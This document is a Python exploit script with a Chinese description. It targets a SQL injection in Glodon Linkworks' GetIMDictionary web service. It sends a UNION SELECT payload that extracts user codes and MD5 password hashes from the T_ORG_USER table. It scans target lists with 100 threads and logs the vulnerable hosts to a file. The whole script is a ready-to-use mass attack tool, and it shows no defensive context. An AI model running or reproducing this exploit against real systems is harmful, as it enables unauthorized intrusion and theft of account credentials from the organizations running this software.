import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________________       ___________       ______                        ______               ____________________ 
__  ____/__  /___  __ \      ___  /___(_)_________  /____      _________________  /_________      __  ___/_  __ \__  / 
_  / __ __  / __  / / /________  / __  /__  __ \_  //_/_ | /| / /  __ \_  ___/_  //_/_  ___/___________ \_  / / /_  /  
/ /_/ / _  /___  /_/ /_/_____/  /___  / _  / / /  ,<  __ |/ |/ // /_/ /  /   _  ,<  _(__  )_/_____/___/ // /_/ /_  /___
\____/  /_____/_____/        /_____/_/  /_/ /_//_/|_| ____/|__/ \____//_/    /_/|_| /____/        /____/ \___\_\/_____/
                                                                                                                       """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='广联达 Linkworks GetIMDictionarySQL 注入漏洞(账号密码!!!)')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
    headers = {
        'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)',
        'Content-Length':'88',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'close',
    }
    data = "dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'value' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()